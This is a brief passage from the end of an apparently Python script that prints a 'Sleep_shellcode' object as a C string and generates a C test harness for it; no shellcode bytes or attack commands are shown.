    print_as_c_string(sleep.Sleep_shellcode)
    CTestHarnessGenerator(sleep.Sleep_shellcode)


if __name__ == "__main__":
    main()
